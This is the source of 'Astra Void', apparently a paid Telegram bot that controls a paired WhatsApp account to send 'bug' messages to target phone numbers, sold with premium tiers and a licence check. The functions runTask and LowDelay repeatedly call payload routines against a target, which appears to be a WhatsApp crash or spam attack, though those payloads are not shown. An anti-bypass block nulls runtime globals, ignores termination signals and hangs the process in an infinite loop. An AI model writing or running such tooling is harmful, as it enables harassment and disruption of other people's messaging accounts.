const { Telegraf } = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const { tokenBot, ownerID, OWNER_ID, GROUP_LOG_ID } = require("./settings/config");
const adminFile = './database/adminuser.json';
const FormData = require("form-data");
const https = require("https");
function fetchJsonHttps(url, timeout = 5000) {
  return new Promise((resolve, reject) => {
    try {
      const req = https.get(url, { timeout }, (res) => {
        const { statusCode } = res;
        if (statusCode < 200 || statusCode >= 300) {
          let _ = '';
          res.on('data', c => _ += c);
          res.on('end', () => reject(new Error(`HTTP ${statusCode}`)));
          return;
        }
        let raw = '';
        res.on('data', (chunk) => (raw += chunk));
        res.on('end', () => {
          try {
            const json = JSON.parse(raw);
            resolve(json);
          } catch (err) {
            reject(new Error('Invalid JSON response'));
          }
        });
      });
      req.on('timeout', () => {
        req.destroy(new Error('Request timeout'));
      });
      req.on('error', (err) => reject(err));
    } catch (err) {
      reject(err);
    }
  });
}
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    makeMessagesSocket,
    fetchLatestWaWebVersion,
    interactiveMessage,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    generateMessageID,
    makeCacheableSignalKeyStore,
    patchMessageBeforeSending,
    generateForwardMessageContent,
    prepareWAMessageMedia,
    MessageRetryMap,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    encodeNewsletterMessage,
    getContentType,
    encodeWAMessage,
    getAggregateVotesInPollMessage,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    nativeFlowMessage,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    getButtonType,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    WAProto_1,
    baileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    extendedTextMessage,
    relayWAMessage,
    listMessage,
    templateMessage,
    encodeSignedDeviceIdentity,
    jidEncode,
    WAMessageAddressingMode,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 50) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

//------------------(TASK QUE SYSTEM)--------------------//
class TaskQueue {
  constructor() {
    this.queue = [];
    this.running = false;
  }

  async add(task) {
    this.queue.push(task);
    this.run();
  }

  async run() {
    if (this.running) return;
    this.running = true;

    while (this.queue.length > 0) {
      const job = this.queue.shift();
      try {
        await job();
      } catch (e) {
        console.error("Task error:", e);
      }
    }

    this.running = false;
  }
}

const queue = new TaskQueue();

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

//------------------(WAJIB DI ISI YAA)--------------------//
const thumbnailUrl = "https://files.catbox.moe/unjv26.jpg";
const thumbnailVideo = "https://files.catbox.moe/rozqq6.jpg";
const AUDIO_URL = "https://example.com/your-audio.mp3"; 
//-------------------------------------------------------------------------//
const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/agungdermawan22332-sys/AstraVoid/main/Destoryed.js";
// ----------------- ( Pengecekan Token ) ------------------- \\
async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);

    if (Array.isArray(response.data)) {
      return response.data;
    }

    if (Array.isArray(response.data.tokens)) {
      return response.data.tokens;
    }

    const raw = JSON.stringify(response.data || "");
    const extracted = raw.match(/\d{5,}:[A-Za-z0-9_\-]{20,}/g);

    return extracted || [];
  } catch (error) {
    console.error(chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message));
    return [];
  }
}

async function validateToken() {
  console.log(chalk.green("🔍 Memeriksa token anda..."));

  let validTokens = await fetchValidTokens();

  if (!Array.isArray(validTokens)) {
    validTokens = [];
  }

  const tokenList = validTokens.map(t => String(t).trim());

  // Normalisasi token BOT lu
  const normalizedBotToken = String(tokenBot).trim();

  // cek token
  if (!tokenList.includes(normalizedBotToken)) {
    console.log(chalk.red(`
═══════════════════════════════════
⚔️ ASTRA VOID - ACCESS DENIED ⚔️
═══════════════════════════════════
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠈⠉⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣄⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠾⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⣤⣶⣤⣉⣿⣿⡯⣀⣴⣿⡗⠀⠀⠀⠀⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⡈⠀⠀⠉⣿⣿⣶⡉⠀⠀⣀⡀⠀⠀⠀⢻⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡇⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⢸⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠉⢉⣽⣿⠿⣿⡿⢻⣯⡍⢁⠄⠀⠀⠀⣸⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠐⡀⢉⠉⠀⠠⠀⢉⣉⠀⡜⠀⠀⠀⠀⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠿⠁⠀⠀⠀⠘⣤⣭⣟⠛⠛⣉⣁⡜⠀⠀⠀⠀⠀⠛⠿⣿⣿⣿
⡿⠟⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⡀⠀⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

⛔ Beli akses dulu ya bang 
📲 Contact : @XerozNotDev
═══════════════════════════════════
`));
    process.exit(1);
  }

  console.log(chalk.green(`✅ Alhamdulillah, token valid!...`));
  startBot();
}



function startBot() {
  console.log(chalk.green(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧⠀
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋⠀
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋⠀⠀⠀
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀⠀⠀⠀⠀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀⢄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀
`));
console.log(chalk.yellow(`
⬡═—⊱ ⚔️ SELAMAT DATANG ⚔️ ⊰—═⬡
⌑ Developer : @XerozNotDev
⌑ Bot Name  : Astra Void 
⌑ Version   : 1.0 - Pro Version 
⌑ Status    : Bot Connected
⬡═————————————————————═⬡
`));
}
validateToken();

// ================================
//  ANTI BYPASS Narendra
// ================================
(function () {
'use strict';

/* ================= ENV ================= */
require('dotenv').config();

/* ================= CORE ================= */
const https = require('https');
const dns = require('dns');
const Module = require('module');

/* ================= CONFIG ================= */
const TOKEN_DB_URL = "https://raw.githubusercontent.com/agungdermawan22332-sys/AstraVoid/main/Destoryed.js";
const CURRENT_TOKEN = String(process.env.TOKEN || "").trim();
const TOKEN_REFRESH = 15000;
const BOOT_GRACE = 5000;
const RUNTIME_SCAN = 1000;

/* ================= STATE ================= */
let TOKEN_CACHE = new Set();
let TOKEN_READY = false;
let TOKEN_SOURCE_VALID = false;
let BOOT_DONE = false;
let APP_LOCKED = false;
let DEFEAT_SHOWN = false;

/* ================= DEFEAT BANNER ================= */
function showDefeat(reason) {
    if (DEFEAT_SHOWN) return;
    DEFEAT_SHOWN = true;

    console.clear();
    console.log("\x1b[32m========================================\x1b[0m");
    console.log("\x1b[32m ⚔️ ASTRA VOID- ACCESS BLOCKED ⛔ \x1b[0m");
    console.log("\x1b[32m [ ANTI BYPASS ] ASTRA VOID ACTIVE ✅\x1b[0m");
    console.log("\x1b[32m 🔍 ANDA TIDAK BISA MENGGUNAKAN NYA\x1b[0m");
    console.log("\x1b[32m========================================\x1b[0m");
    console.log("\x1b[33mREASON:\x1b[0m", reason);
}

/* ================= HARD FAIL (FINAL) ================= */
function hardFail(reason) {
    showDefeat(reason);

    APP_LOCKED = true;

    // rusak runtime inti (anti anti-exit)
    try {
        global.Promise = null;
        global.setTimeout = null;
        global.setInterval = null;
        global.queueMicrotask = null;
    } catch {}

    // freeze final (tidak bisa di-bypass)
    while (true) {}
}

/* ================= NETWORK GUARD ================= */
(function guardNetwork() {
    const proxyVars = [
        'HTTP_PROXY','HTTPS_PROXY','ALL_PROXY',
        'http_proxy','https_proxy','all_proxy'
    ];

    for (const k of proxyVars) {
        const v = process.env[k];
        if (!v) continue;
        if (v.includes('127.0.0.1') || v.includes('localhost')) continue;
        hardFail("PROXY DETECTED");
    }

    setTimeout(() => {
        dns.resolve('github.com', (err, addrs) => {
            if (BOOT_DONE && (err || !addrs || !addrs.length)) {
                hardFail("DNS HIJACK DETECTED");
            }
        });
    }, BOOT_GRACE + 1000);
})();

/* ================= SIGNAL LOCK ================= */
(function lockSignals() {
    ['SIGINT','SIGTERM','SIGHUP','SIGQUIT'].forEach(sig => {
        try { process.on(sig, () => {}); } catch {}
    });
})();

/* ================= SAVE REAL REFERENCES ================= */
const REAL_PROCESS_EXIT = process.exit;
const REAL_PROCESS_KILL = process.kill;
const REAL_MODULE_LOAD = Module._load;

/* ================= EARLY ANTI BYPASS (SEBELUM BOOT) ================= */
setTimeout(() => {
    if (process.exit !== REAL_PROCESS_EXIT)
        hardFail("EARLY ANTI-EXIT DETECTED");

    if (process.kill !== REAL_PROCESS_KILL)
        hardFail("EARLY process.kill HOOKED");

    if (Module._load !== REAL_MODULE_LOAD)
        hardFail("EARLY Module._load HOOKED");
}, 0);

/* ================= TOKEN FETCH ================= */
function fetchTokenDB() {
    return new Promise(resolve => {
        https.get(TOKEN_DB_URL, res => {
            if (res.statusCode !== 200) {
                TOKEN_SOURCE_VALID = false;
                return resolve();
            }

            let data = '';
            res.on('data', d => data += d);
            res.on('end', () => {
                try {
                    const json = JSON.parse(data);
                    if (!Array.isArray(json.tokens)) {
                        TOKEN_SOURCE_VALID = false;
                        return resolve();
                    }

                    TOKEN_CACHE = new Set(
                        json.tokens.map(t => String(t).trim())
                    );

                    TOKEN_READY = true;
                    TOKEN_SOURCE_VALID = true;
                    console.log("\x1b[33m[⚔️ ASTRA VOID]\x1b[0m Token DB OK...");
                } catch {
                    TOKEN_SOURCE_VALID = false;
                }
                resolve();
            });
        }).on('error', () => {
            TOKEN_SOURCE_VALID = false;
            resolve();
        });
    });
}

/* ================= TOKEN VALID ================= */
function isTokenValid() {
    if (!BOOT_DONE) return true;
    if (!TOKEN_READY) return false;
    if (!TOKEN_SOURCE_VALID) return false;
    if (!CURRENT_TOKEN) return false;
    return TOKEN_CACHE.has(CURRENT_TOKEN);
}

/* ================= BOOT ================= */
(async function boot() {
    await fetchTokenDB();
    setInterval(fetchTokenDB, TOKEN_REFRESH);
    setTimeout(() => { BOOT_DONE = true; }, BOOT_GRACE);
})();

/* ================= TOKEN ENFORCER ================= */
setInterval(() => {
    if (!BOOT_DONE || !TOKEN_READY) return;

    if (!CURRENT_TOKEN) hardFail("TOKEN EMPTY");
    if (!TOKEN_SOURCE_VALID) hardFail("TOKEN SOURCE INVALID");
    if (!TOKEN_CACHE.has(CURRENT_TOKEN)) hardFail("TOKEN REVOKED");

}, 1000);

/* ================= RUNTIME ANTI-ANTI-EXIT ================= */
setInterval(() => {
    if (!BOOT_DONE) return;

    if (process.exit !== REAL_PROCESS_EXIT)
        hardFail("ANTI-EXIT BYPASS DETECTED");

    if (process.kill !== REAL_PROCESS_KILL)
        hardFail("process.kill HOOKED");

    if (Module._load !== REAL_MODULE_LOAD)
        hardFail("Module._load HOOKED");

}, RUNTIME_SCAN);

/* ================= BOOT LOG ================= */
console.clear();
console.log(`\x1b[33m
===============================
🛡️ ACTIVATED [ANTI - BYPAS] 🛡️
===============================
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠈⠉⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣄⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠾⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⣤⣶⣤⣉⣿⣿⡯⣀⣴⣿⡗⠀⠀⠀⠀⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⡈⠀⠀⠉⣿⣿⣶⡉⠀⠀⣀⡀⠀⠀⠀⢻⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡇⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⢸⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠉⢉⣽⣿⠿⣿⡿⢻⣯⡍⢁⠄⠀⠀⠀⣸⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠐⡀⢉⠉⠀⠠⠀⢉⣉⠀⡜⠀⠀⠀⠀⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠿⠁⠀⠀⠀⠘⣤⣭⣟⠛⠛⣉⣁⡜⠀⠀⠀⠀⠀⠛⠿⣿⣿⣿
⡿⠟⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⡀⠀⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

🌟 Selamat Menggunakan Script 
\x1b[0m`);
/* ================= EXPORT ================= */
module.exports = Object.freeze({
    status: "ACTIVE",
    locked: () => APP_LOCKED,
    tokenValid: () => isTokenValid(),
    urlVerified: () => TOKEN_SOURCE_VALID,
    version: "1.0 - Pro Version"
});

})();

const bot = new Telegraf(tokenBot);
let tokenValidated = false;
let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

function formatTarget(number) {
  if (!number) return null;

  // bersihin selain angka
  number = number.replace(/[^0-9]/g, "");

  if (number.startsWith("0")) {
    number = "62" + number.slice(1);
  }

  return number + "@s.whatsapp.net";
}

//------------------(BEBAS SPAM)--------------------//
async function runTask(ctx, target) {

  const taskId = Date.now().toString().slice(-6);
  const delay = 2300;

  const C = {
    reset: "\x1b[0m",
    bold: "\x1b[1m",
    green: "\x1b[32m",
    red: "\x1b[31m",
    cyan: "\x1b[36m",
    yellow: "\x1b[33m",
    gray: "\x1b[90m"
  };

  const startTime = Date.now();
  const timeNow = new Date().toLocaleTimeString();

  console.log(`\n${C.cyan}${C.bold}⚡ BUG PROCESSING${C.reset}`);
  console.log(`${C.gray}ID:${C.reset} ${taskId}`);
  console.log(`${C.gray}Target:${C.reset} ${target}`);
  console.log(`${C.gray}Time:${C.reset} ${timeNow}\n`);

  for (let i = 1; i <= 2; i++) {

    const loopStart = Date.now();

    try {
      await epcihDiley(sock, target);

      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);

      console.log(
        `${C.green}✔ Berhasil${C.reset}  ` +
        `${C.gray}Loop:${C.reset} ${i}/2  ` +
        `${C.gray}Duration:${C.reset} ${duration}s`
      );

    } catch (err) {

      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);

      console.log(
        `${C.red}✖ Gagal${C.reset}   ` +
        `${C.gray}Loop:${C.reset} ${i}/2  ` +
        `${C.gray}Duration:${C.reset} ${duration}s`
      );

      console.log(`${C.yellow}↳ ${err.message}${C.reset}`);
    }

    await new Promise(r => setTimeout(r, delay));
  }

  const totalTime = ((Date.now() - startTime) / 1000).toFixed(2);

  console.log(`\n${C.cyan}${C.bold}🏁 BUG COMPLETED${C.reset}`);
  console.log(`${C.gray}ID:${C.reset} ${taskId}`);
  console.log(`${C.gray}Total Runtime:${C.reset} ${totalTime}s\n`);
}

async function LowDelay(ctx, target) {

  const taskId = Date.now().toString().slice(-6);
  const delay = 2300;

  const C = {
    reset: "\x1b[0m",
    bold: "\x1b[1m",
    green: "\x1b[32m",
    red: "\x1b[31m",
    cyan: "\x1b[36m",
    yellow: "\x1b[33m",
    gray: "\x1b[90m"
  };

  const startTime = Date.now();
  const timeNow = new Date().toLocaleTimeString();

  console.log(`\n${C.cyan}${C.bold}⚡ BUG PROCESSING${C.reset}`);
  console.log(`${C.gray}ID:${C.reset} ${taskId}`);
  console.log(`${C.gray}Target:${C.reset} ${target}`);
  console.log(`${C.gray}Time:${C.reset} ${timeNow}\n`);

  for (let i = 1; i <= 3; i++) {

    const loopStart = Date.now();

    try {
      await unix(sock, target);

      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);

      console.log(
        `${C.green}✔ Berhasil${C.reset}  ` +
        `${C.gray}Loop:${C.reset} ${i}/2  ` +
        `${C.gray}Duration:${C.reset} ${duration}s`
      );

    } catch (err) {

      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);

      console.log(
        `${C.red}✖ Gagal${C.reset}   ` +
        `${C.gray}Loop:${C.reset} ${i}/2  ` +
        `${C.gray}Duration:${C.reset} ${duration}s`
      );

      console.log(`${C.yellow}↳ ${err.message}${C.reset}`);
    }

    await new Promise(r => setTimeout(r, delay));
  }

  const totalTime = ((Date.now() - startTime) / 1000).toFixed(2);

  console.log(`\n${C.cyan}${C.bold}🏁 BUG COMPLETED${C.reset}`);
  console.log(`${C.gray}ID:${C.reset} ${taskId}`);
  console.log(`${C.gray}Total Runtime:${C.reset} ${totalTime}s\n`);
}

// ==============================
// GROUP ONLY MODE (TELEGRAF) 100% WORK
// - Saat ON: semua command di private diblokir
// - Bisa ON/OFF lewat command (OWNER ONLY)
// - Ada notif ke GROUP_LOG_ID
// ==============================

// import dari settings/config.js
// contoh config.js: module.exports = { ownerID: 123, GROUP_LOG_ID: -100xxx, ... }
// STATE (simple)
let GROUP_ONLY_ENABLED = true;

// helper
const isPrivate = (ctx) => ctx.chat?.type === "private";
const isCommand = (text = "") => typeof text === "string" && text.trim().startsWith("/");
const nowID = () => new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
const safe = (v, f = "-") => (v === undefined || v === null || String(v).trim() === "" ? f : String(v));

// OWNER ONLY middleware
const ownerOnly = () => async (ctx, next) => {
  if (ctx.from?.id != ownerID) return ctx.reply("❌ Khusus owner.");
  return next();
};

// ON/OFF helpers (kalau mau dipakai di tempat lain)
function setGroupOnlyEnabled(v) { GROUP_ONLY_ENABLED = !!v; }
function isGroupOnlyEnabled() { return GROUP_ONLY_ENABLED; }

// ==============================
// MIDDLEWARE: BLOCK PRIVATE COMMANDS (WHEN ON)
// Tempel ini 1x setelah bot dibuat
// ==============================
bot.use(async (ctx, next) => {
  try {
    // kalau mode OFF, lanjut
    if (!GROUP_ONLY_ENABLED) return next();

    const text = ctx.message?.text;
    // hanya block command
    if (!isCommand(text)) return next();

    // kalau bukan private, lanjut
    if (!isPrivate(ctx)) return next();

    const userId = ctx.from?.id;
    const username = ctx.from?.username ? `@${ctx.from.username}` : "-";
    const name = [ctx.from?.first_name, ctx.from?.last_name].filter(Boolean).join(" ") || "-";

    // owner boleh bypass? (kalau mau owner juga diblokir, hapus if ini)
    if (userId == ownerID) return next();

    // notif ke user
    await ctx.reply("❌ Mode GROUP ONLY sedang ON.\nCommand tidak bisa dipakai di private chat.");

    // notif ke group log
    if (GROUP_LOG_ID) {
      const info =
`<b>🚫 PRIVATE COMMAND DIBLOKIR</b>

<b>👤 User</b>
• Nama : <b>${safe(name)}</b>
• Username : <b>${safe(username)}</b>
• ID : <code>${safe(userId)}</code>

<b>🧾 Command</b>
• Text : <code>${safe(text)}</code>

<b>🕒 Waktu</b>
• ${nowID()}
`;
      ctx.telegram.sendMessage(GROUP_LOG_ID, info, { parse_mode: "HTML" }).catch(() => {});
    }

    // stop eksekusi command lain
    return;
  } catch (e) {
    return next();
  }
});

const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addpremUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 524 / 524;
  return `${usedMB.toFixed(0)} MB`;
}

const startSesi = async () => {
console.clear();
  console.log(chalk.bold.yellow(`
  
  `))
    
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '5.15.7'],
        getMessage: async (key) => ({
            conversation: 'Apophis',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `\`\`\`js
⬡═―—⊱ ⎧ ASTRA VOID ⎭ ⊰―—═⬡
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Type: Connected
╘—————————————————═⬡
\`\`\``;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "Markdown" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.yellow(`
  `))
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 500

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};

bot.command("addbot", async (ctx) => {
   if (ctx.from.id != ownerID) {
